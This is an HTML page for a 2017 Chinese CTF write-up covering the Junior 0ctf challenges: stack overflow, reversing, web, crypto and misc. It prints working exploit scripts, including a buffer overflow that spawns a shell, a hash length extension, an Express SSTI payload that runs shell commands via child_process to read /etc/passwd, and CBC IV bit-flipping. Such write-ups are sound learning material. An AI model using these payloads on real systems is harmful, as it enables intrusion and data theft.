@@ -1,0 +1,193 @@
+<!doctype html><html lang=zh-hans><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta name=author content="Liq3e"><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-166034540-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><link rel=prev href=https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-2/><link rel=next href=https://blog.usec.cc/posts/security/misc/exploit-exercises-protostar-stack/><link rel=canonical href=https://blog.usec.cc/posts/security/ctf/wp-for-junior-0ctf/><link rel=icon type=image/png sizes=32x32 href=/favicon.ico><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>Wirteup - Junior 0ctf 2017 | L33'</title><meta name=title content="Wirteup - Junior 0ctf 2017 | L33'"><link rel=stylesheet href=/font/iconfont.css><link rel=stylesheet href=/css/main.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.usec.cc/"},"articleSection":"posts","name":"Wirteup - Junior 0ctf 2017","headline":"Wirteup - Junior 0ctf 2017","description":"PWN seabreeze\u0026rsquo;s stack 栈溢出题目，直接在IDA中可以看到缓冲区相对于栈基址的偏移：bp-3FCH，然后可以看到题目中有一getshell()函数，其地址为0x080485CB。 覆盖原本的函数返回地址为getshell()的地址，利用以下脚本获取shell： from pwn import * conn = remote(\u0026#39;202.121.178.181\u0026#39;, \u0026#39;12321\u0026#39;) print conn.recvline() conn.sendline(\u0026#39;Yes!\u0026#39;) print conn.recvline() conn.sendline(\u0026#39;Yes!!\u0026#39;) print conn.recvline() conn.sendline(\u0026#39;Yes!!!\u0026#39;) shell_addr = 0x080485cb","inLanguage":"zh-Hans","author":"Liq3e","creator":"Liq3e","publisher":"Liq3e","accountablePerson":"Liq3e","copyrightHolder":"Liq3e","copyrightYear":"2017","datePublished":"2017-12-18T00:00:00+08:00","dateModified":"2017-12-18T00:00:00+08:00","url":"https://blog.usec.cc/posts/security/ctf/wp-for-junior-0ctf/","wordCount":2158,"keywords":["ctf","L33'"]}</script></head><body><div class=wrapper><nav class=navbar><div class=container><div class="navbar-header header-logo"><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.usec.cc/>L33'</a></div><div class="menu navbar-right"><a class=menu-item href=/posts/>Posts</a>
+<a class=menu-item href=/categories/>Categories</a>
+<a class=menu-item href=/tags/>Tags</a>
+<a class=menu-item href=/about/ title=About>About</a></div></div></nav><nav class=navbar-mobile id=nav-mobile style=display:none><div class=container><div class=navbar-header><div><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.usec.cc/>L33'</a></div><div class=menu-toggle><span></span><span></span><span></span></div></div><div class=menu id=mobile-menu><a class=menu-item href=/posts/>Posts</a>
+<a class=menu-item href=/categories/>Categories</a>
+<a class=menu-item href=/tags/>Tags</a>
+<a class=menu-item href=/about/ title=About>About</a></div></div></nav><main class=main><div class=container><article class=post-warp itemscope itemtype=http://schema.org/Article><header class=post-header><h1 class=post-title itemprop="name headline">Wirteup - Junior 0ctf 2017</h1><div class=post-meta>Written by <a itemprop=name href=https://blog.usec.cc/ rel=author>Liq3e</a> with ♥
+<span class=post-time>on <time datetime=2017-12-18 itemprop=datePublished>December 18, 2017</time></span>
+in
+<i class="iconfont icon-folder"></i><span class=post-category><a href=https://blog.usec.cc/categories/security/>Security</a></span></div></header><div class=post-content><h2 id=pwn>PWN</h2><h3 id=seabreezes-stack>seabreeze&rsquo;s stack</h3><p>栈溢出题目，直接在IDA中可以看到缓冲区相对于栈基址的偏移：<code>bp-3FCH</code>，然后可以看到题目中有一<code>getshell()</code>函数，其地址为<code>0x080485CB</code>。</p><p>覆盖原本的函数返回地址为<code>getshell()</code>的地址，利用以下脚本获取shell：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+conn <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;202.121.178.181&#39;</span>, <span style=color:#e6db74>&#39;12321&#39;</span>)
+<span style=color:#66d9ef>print</span> conn<span style=color:#f92672>.</span>recvline()
+conn<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;Yes!&#39;</span>)
+<span style=color:#66d9ef>print</span> conn<span style=color:#f92672>.</span>recvline()
+conn<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;Yes!!&#39;</span>)
+<span style=color:#66d9ef>print</span> conn<span style=color:#f92672>.</span>recvline()
+conn<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;Yes!!!&#39;</span>)
+
+shell_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x080485cb</span>
+
+payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x3fc</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;bbbb&#39;</span> <span style=color:#f92672>+</span> p32(shell_addr)
+
+conn<span style=color:#f92672>.</span>sendline(payload)
+conn<span style=color:#f92672>.</span>interactive()
+</code></pre></div><p>随后可以读flag。</p><h2 id=reverse>REVERSE</h2><h3 id=babyre>babyre</h3><p>利用<code>uncompyle2</code>工具可以直接获得pyc文件对应的py代码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> md5
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5raw</span>(s):
+    <span style=color:#66d9ef>return</span> bytearray(md5(s)<span style=color:#f92672>.</span>digest())
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>xor</span>(a, b):
+    <span style=color:#66d9ef>assert</span> len(a) <span style=color:#f92672>==</span> len(b)
+    <span style=color:#66d9ef>return</span> bytearray([ i <span style=color:#f92672>^</span> j <span style=color:#66d9ef>for</span> i, j <span style=color:#f92672>in</span> zip(a, b) ])
+
+
+flag <span style=color:#f92672>=</span> bytearray(raw_input(<span style=color:#e6db74>&#39;Show me your flag: &#39;</span>))
+<span style=color:#66d9ef>assert</span> len(flag) <span style=color:#f92672>==</span> <span style=color:#ae81ff>32</span>
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>16</span>):
+    flag[:<span style=color:#ae81ff>16</span>] <span style=color:#f92672>=</span> xor(flag[:<span style=color:#ae81ff>16</span>], md5raw(flag[<span style=color:#ae81ff>16</span>:]))
+    flag[:<span style=color:#ae81ff>16</span>], flag[<span style=color:#ae81ff>16</span>:] <span style=color:#f92672>=</span> flag[<span style=color:#ae81ff>16</span>:], flag[:<span style=color:#ae81ff>16</span>]
+
+<span style=color:#66d9ef>if</span> flag <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xa5\xc6\xe6\xec</span><span style=color:#e6db74>a</span><span style=color:#ae81ff>\x0c</span><span style=color:#e6db74>:ED</span><span style=color:#ae81ff>\xed</span><span style=color:#e6db74>#</span><span style=color:#ae81ff>\x19\x94</span><span style=color:#e6db74>LF</span><span style=color:#ae81ff>\x11\x17\xc4</span><span style=color:#e6db74>.</span><span style=color:#ae81ff>\xeb\xa1\xc2</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\xc1</span><span style=color:#e6db74>&lt;</span><span style=color:#ae81ff>\xa9\\</span><span style=color:#e6db74>A</span><span style=color:#ae81ff>\xde\xd2</span><span style=color:#e6db74>2</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>:
+    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#39;Right!&#39;</span>
+<span style=color:#66d9ef>else</span>:
+    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#39;Wrong!&#39;</span>
+</code></pre></div><p>可以看到给出了加密结果和加密过程，需要反求原文。加密数据长度为32字节，分为左右两个部分各16字节，将第一部分与第二部分的MD5做异或之后保存为新的第一部分，然后将两部分位置互换，循环16次。</p><p>由于异或是可逆的，那么解密过程就是将密文先调换位置再进行异或，循环16次。脚本：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> md5
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5raw</span>(s):
+    <span style=color:#66d9ef>return</span> bytearray(md5(s)<span style=color:#f92672>.</span>digest())
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>xor</span>(a, b):
+    <span style=color:#66d9ef>assert</span> len(a) <span style=color:#f92672>==</span> len(b)
+    <span style=color:#66d9ef>return</span> bytearray([ i <span style=color:#f92672>^</span> j <span style=color:#66d9ef>for</span> i, j <span style=color:#f92672>in</span> zip(a, b) ])
+
+
+flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xa5\xc6\xe6\xec</span><span style=color:#e6db74>a</span><span style=color:#ae81ff>\x0c</span><span style=color:#e6db74>:ED</span><span style=color:#ae81ff>\xed</span><span style=color:#e6db74>#</span><span style=color:#ae81ff>\x19\x94</span><span style=color:#e6db74>LF</span><span style=color:#ae81ff>\x11\x17\xc4</span><span style=color:#e6db74>.</span><span style=color:#ae81ff>\xeb\xa1\xc2</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\xc1</span><span style=color:#e6db74>&lt;</span><span style=color:#ae81ff>\xa9\\</span><span style=color:#e6db74>A</span><span style=color:#ae81ff>\xde\xd2</span><span style=color:#e6db74>2</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
+flag <span style=color:#f92672>=</span> bytearray(flag)
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>16</span>):
+    flag[:<span style=color:#ae81ff>16</span>], flag[<span style=color:#ae81ff>16</span>:] <span style=color:#f92672>=</span> flag[<span style=color:#ae81ff>16</span>:], flag[:<span style=color:#ae81ff>16</span>]
+    flag[:<span style=color:#ae81ff>16</span>] <span style=color:#f92672>=</span> xor(flag[:<span style=color:#ae81ff>16</span>], md5raw(flag[<span style=color:#ae81ff>16</span>:]))
+
+<span style=color:#66d9ef>print</span> flag
+</code></pre></div><h3 id=encoder>encoder</h3><p>利用IDA分析代码，可以看出这编码类似于base32编码，将5个字节用八个可见字符来表示。</p><p>代码的关键逻辑位于<code>sub_4006d6</code>中，如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>_BYTE <span style=color:#f92672>*</span><span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>sub_4006D6</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> a1, <span style=color:#66d9ef>signed</span> <span style=color:#66d9ef>int</span> a2)
+{
+  <span style=color:#66d9ef>signed</span> <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// [sp+14h] [bp-2Ch]@4
+</span><span style=color:#75715e></span>  <span style=color:#66d9ef>signed</span> <span style=color:#66d9ef>int</span> j; <span style=color:#75715e>// [sp+14h] [bp-2Ch]@9
+</span><span style=color:#75715e></span>  <span style=color:#66d9ef>signed</span> <span style=color:#66d9ef>int</span> v5; <span style=color:#75715e>// [sp+18h] [bp-28h]@2
+</span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> v6; <span style=color:#75715e>// [sp+1Ch] [bp-24h]@9
+</span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v7; <span style=color:#75715e>// [sp+20h] [bp-20h]@2
+</span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v8; <span style=color:#75715e>// [sp+28h] [bp-18h]@1
+</span><span style=color:#75715e></span>  _BYTE <span style=color:#f92672>*</span>v9; <span style=color:#75715e>// [sp+30h] [bp-10h]@1
+</span><span style=color:#75715e></span>  _BYTE <span style=color:#f92672>*</span>v10; <span style=color:#75715e>// [sp+38h] [bp-8h]@1
+</span><span style=color:#75715e></span>
+  v10 <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>8</span> <span style=color:#f92672>*</span> (a2 <span style=color:#f92672>/</span> <span style=color:#ae81ff>5</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>);
+  v8 <span style=color:#f92672>=</span> a1;
+  v9 <span style=color:#f92672>=</span> v10;
+  <span style=color:#66d9ef>while</span> ( a2 <span style=color:#f92672>+</span> a1 <span style=color:#f92672>&gt;</span> v8 )
+  {
+    v7 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0LL</span>;
+    v5 <span style=color:#f92672>=</span> a2 <span style=color:#f92672>+</span> a1 <span style=color:#f92672>-</span> v8;
+    <span style=color:#66d9ef>if</span> ( v5 <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>5</span> )
+      v5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;
+    <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>4</span>; <span style=color:#f92672>++</span>i )
+    {
+      v7 <span style=color:#f92672>&lt;&lt;=</span> <span style=color:#ae81ff>8</span>;
+      <span style=color:#66d9ef>if</span> ( i <span style=color:#f92672>&lt;</span> v5 )
+        v7 <span style=color:#f92672>|=</span> <span style=color:#f92672>*</span>(_BYTE <span style=color:#f92672>*</span>)(i <span style=color:#f92672>+</span> v8);
+    }
+    v6 <span style=color:#f92672>=</span> dword_6010B0[v5 <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>];
+    <span style=color:#66d9ef>for</span> ( j <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>; j <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span>; <span style=color:#f92672>--</span>j )
+    {
+      v9[j] <span style=color:#f92672>=</span> byte_601080[v7 <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x1F</span>];
+      v7 <span style=color:#f92672>&gt;&gt;=</span> <span style=color:#ae81ff>5</span>;
+    }
+    <span style=color:#66d9ef>if</span> ( v6 )
+      memset(<span style=color:#f92672>&amp;</span>v9[<span style=color:#ae81ff>8LL</span> <span style=color:#f92672>-</span> v6], <span style=color:#ae81ff>61</span>, v6);
+    v8 <span style=color:#f92672>+=</span> <span style=color:#ae81ff>5LL</span>;
+    v9 <span style=color:#f92672>+=</span> <span style=color:#ae81ff>8</span>;
+  }
+  <span style=color:#f92672>*</span>v9 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+  <span style=color:#66d9ef>return</span> v10;
+}
+</code></pre></div><p><code>a1</code>为原文数据指针，<code>a2</code>为数据长度，<code>v9</code>、<code>v10</code>为编码后密文数据指针。</p><p>每个while循环都处理原文的五个字节，先将五个字节移到<code>v7</code>变量中，然后再每五个bit地逐个取出，作为下标，取出地址0x601080处的字符串（<code>afe7WlyVd12XKLhnqvzQb5B6sNR8gYME</code>）中的字符作为密文。长度不足五个字节时，密文则使用<code>=</code>填充。</p><p>不是很会用python处理bit级的数据，所以用脚本得到明文的字符串形式的01二进制串，随后在网上随便找了个在线的二进制转字符串的工具得到flag，不过需要删掉最后的多余二进制数据。</p><pre><code>flag{d0_U_Kn0w_ba5e32:P}
+</code></pre><p>脚本：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python                                 </span>
+<span style=color:#75715e>#coding=utf-8</span>
+
+key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;afe7WlyVd12XKLhnqvzQb5B6sNR8gYME&#34;</span>
+cipher <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;KNByeN88KqslM52E1L67aYREK1qQ2N1QydYlaEd&#34;</span>
+
+l <span style=color:#f92672>=</span> []
+
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(cipher)):
+    l<span style=color:#f92672>.</span>append(key<span style=color:#f92672>.</span>index(cipher[i]))
+
+s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> l:
+    b <span style=color:#f92672>=</span> bin(i)[<span style=color:#ae81ff>2</span>:]
+    b <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>5</span> <span style=color:#f92672>-</span> len(b)) <span style=color:#f92672>+</span> b
+    s <span style=color:#f92672>+=</span> b
+
+<span style=color:#66d9ef>print</span> s<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;bin&#39;</span>)
+</code></pre></div><h3 id=admin>admin</h3><p>利用IDA逆向分析，此题在<code>sub_400980</code>函数中做了一堆函数指针变量等的初始化，所以后面的代码全是变量名。。。</p><p>加密的过程中有两个循环，经过分析，第一个循环主要是对地址<code>0x6010A0</code>的256bytes的有序数据的处理，可以认为是在生成密钥，事实上无需对此过程进行详细分析，这一部分与输入无关。</p><p>第二个循环则是将用户输入的数据与刚刚生成的密钥进行一系列异或处理，然后判断加密结果是否与地址<code>0x601080</code>的20个字节相等；如果相等，则输入正确。</p><p>根据异或运算的可逆性，我们同样不用具体分析到底加密处理是什么具体流程，将<code>0x601080</code>处的数据作为输入，则结果即为我们要的flag。只是此处需要用gdb动态调试一下，在输入处理完后断下，观察内存中得出的flag值。</p><h2 id=web>WEB</h2><h3 id=penetrate-in>penetrate in</h3><p>此题考点为哈希长度扩展攻击，可以利用hashpumpy来解决。其中secret的长度未知，需要暴力破解一下。</p><p>脚本：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python </span>
+<span style=color:#75715e>#coding=utf-8</span>
+
+<span style=color:#f92672>import</span> hashpumpy
+<span style=color:#f92672>import</span> requests
+
+url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://202.121.178.201:8081/index.php&#34;</span>
+data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;username&#34;</span> : <span style=color:#e6db74>&#34;admin&#34;</span>, <span style=color:#e6db74>&#34;password&#34;</span> : <span style=color:#e6db74>&#34;&#34;</span>}
+headers <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;Cookie&#34;</span> : <span style=color:#e6db74>&#34;&#34;</span>}
+
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>100</span>):
+    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;secret length: &#34;</span>  <span style=color:#f92672>+</span> str(i)
+    res <span style=color:#f92672>=</span> hashpumpy<span style=color:#f92672>.</span>hashpump(<span style=color:#e6db74>&#34;be9fcfa876db5f4184e1635ce6561de7&#34;</span>, <span style=color:#e6db74>&#34;|admin|admin&#34;</span>, <span style=color:#e6db74>&#34;a&#34;</span>, i)
+    headers[<span style=color:#e6db74>&#34;Cookie&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;hmac=&#34;</span> <span style=color:#f92672>+</span> res[<span style=color:#ae81ff>0</span>]
+    data[<span style=color:#e6db74>&#34;password&#34;</span>] <span style=color:#f92672>=</span> res[<span style=color:#ae81ff>1</span>][<span style=color:#ae81ff>7</span>:]
+    <span style=color:#66d9ef>print</span> headers
+    <span style=color:#66d9ef>print</span> data
+
+    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>data, headers<span style=color:#f92672>=</span>headers)
+    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;flag&#39;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>text:
+        <span style=color:#66d9ef>print</span> r<span style=color:#f92672>.</span>text
+        exit()
+</code></pre></div><h3 id=shatter-sha512>Shatter Sha512!</h3><p>此题hash结果的相等判断处使用的是严格的<code>===</code>，这就想到PHP的一个trick，hash函数不能处理<code>Array</code>类型的变量，首先会把<code>Array</code>类型的变量转换为常量字符串<code>"Array"</code>。</p><p>将变量设置为数组类型即可绕过：</p><pre><code>http://addr/?x[]=1&amp;y[]=2
+</code></pre><h3 id=super-security-blog>Super Security Blog</h3><p>此题采用的node.js的express框架为后端，考虑存在SSTI漏洞，在post新文章时构造内容<code>{{7*7}}</code>，可以得到输出49，说明存在漏洞。</p><p>构造post文章的内容为</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>{{<span style=color:#a6e22e>range</span>.<span style=color:#a6e22e>constructor</span>(<span style=color:#e6db74>&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;tail /etc/passwd&#39;)&#34;</span>)()}}
+</code></pre></div><p>验证可以执行shell命令，进而拿到flag。</p><h2 id=crypto>CRYPTO</h2><h3 id=aes-server>AES-server</h3><p>此题中使用的AES加密模式为CBC模式，加密的数据只有一个分组，并且我们可以直接控制IV的值。</p><p>可以利用CBC字节反转攻击来获取flag，CBC模式解密时将分组解密后的结果与上一个分组的密文异或之后才是明文，第一个分组则是与IV异或，IV中一个bit位的改变会导致结果中对应bit位的改变。</p><p>既然我们可以控制IV，那么就可以控制解密结果。首先随便构造IV与密文，根据传输回来的结果的前五个字节与<code>'admin'</code>的差异对应改变IV即可，脚本：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python                                        </span>
+<span style=color:#75715e>#coding=utf-8</span>
+
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+iv <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
+data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
+target <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;admin&#39;</span>
+
+conn <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;202.121.178.199&#39;</span>, <span style=color:#e6db74>&#39;9999&#39;</span>)
+<span style=color:#66d9ef>print</span> conn<span style=color:#f92672>.</span>recvline()
+<span style=color:#66d9ef>print</span> conn<span style=color:#f92672>.</span>recvline()
+
+conn<span style=color:#f92672>.</span>sendline(iv<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;hex&#39;</span>) <span style=color:#f92672>+</span> data<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;hex&#39;</span>))
+re <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recvline()
+<span style=color:#66d9ef>print</span> re
+conn<span style=color:#f92672>.</span>close()
+
+re <span style=color:#f92672>=</span> eval(re[<span style=color:#ae81ff>24</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
+iv <span style=color:#f92672>=</span> list(iv)
+
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>5</span>):
+    iv[i] <span style=color:#f92672>=</span> chr(ord(re[i]) <span style=color:#f92672>^</span> ord(target[i]) <span style=color:#f92672>^</span> ord(iv[i]))
+
+iv <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(iv)
+<span style=color:#66d9ef>print</span> iv
+
+conn <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;202.121.178.199&#39;</span>, <span style=color:#e6db74>&#39;9999&#39;</span>)
+<span style=color:#66d9ef>print</span> conn<span style=color:#f92672>.</span>recvline()
+<span style=color:#66d9ef>print</span> conn<span style=color:#f92672>.</span>recvline()
+
+conn<span style=color:#f92672>.</span>sendline(iv<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;hex&#39;</span>) <span style=color:#f92672>+</span> data<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;hex&#39;</span>))
+re <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>recvline()
+<span style=color:#66d9ef>print</span> re
+<span style=color:#66d9ef>print</span> conn<span style=color:#f92672>.</span>recvline()
+conn<span style=color:#f92672>.</span>close()
+</code></pre></div><h3 id=babyrsa>babyrsa</h3><p>可以从公钥文件得出n的值为</p><pre><code>39845701744153150941069529194757526450699838667585381414738119544695931460213
+</code></pre><p>利用<a href=http://factordb.com/>http://factordb.com/</a>可查的其分解p、q：</p><pre><code>188666695751907128183793686145558707837 *  211196266438828393956393541007231202649
+</code></pre><p>使用rsatool工具通过p、q构造私钥，然后利用openssl解密即得flag。</p><h2 id=misc>MISC</h2><p>Mystery Numbers：首先hex decode，然后base64 decode。</p><p>Easy Traffic Analyze：利用已有pcap文件复制文件头过去修复文件，dump出zip文件，解压得图片，得文件中的明文flag。</p></div><div class=post-copyright><p class=copyright-item><span>Author:</span>
+<span>Liq3e</span></p><p class=copyright-item><span>Link:</span>
+<a href=https://blog.usec.cc/posts/security/ctf/wp-for-junior-0ctf/>https://blog.usec.cc/posts/security/ctf/wp-for-junior-0ctf/</a></p></div><div class=post-tags><section><i class="iconfont icon-tag"></i>Tag(s):
+<span class=tag><a href=https://blog.usec.cc/tags/ctf/>#ctf</a></span></section><section><a href=javascript:window.history.back();>back</a></span> ·
+<span><a href=https://blog.usec.cc/>home</a></span></section></div><div class=post-nav><a href=https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-2/ class=prev rel=prev title="Exploit-exercises Nebula (Level10~19)"><i class="iconfont icon-left"></i>&nbsp;Exploit-exercises Nebula (Level10~19)</a>
+<a href=https://blog.usec.cc/posts/security/misc/exploit-exercises-protostar-stack/ class=next rel=next title="Exploit-exercises Protostar-Stack">Exploit-exercises Protostar-Stack&nbsp;<i class="iconfont icon-right"></i></a></div><div class=post-comment><div id=disqus_thread></div><script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return;}
+var d=document,s=d.createElement('script');s.async=true;s.src='//'+"l33-1"+'.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></article></div></main><footer class=footer><div class=copyright>&copy;
+<span itemprop=copyrightYear>2020 - 2020</span>
+<span class=with-love><i class="iconfont icon-love"></i></span><span class=author itemprop=copyrightHolder><a href=https://blog.usec.cc/>Liq3e</a> |</span>
+<span>Powered by <a href=https://gohugo.io/ target=_blank rel="external nofollow">Hugo</a> & <a href=https://github.com/liuzc/leaveit target=_blank rel="external nofollow">LeaveIt</a></span></div></footer><script src=/js/vendor_no_gallery.min.js async></script></div></body></html>
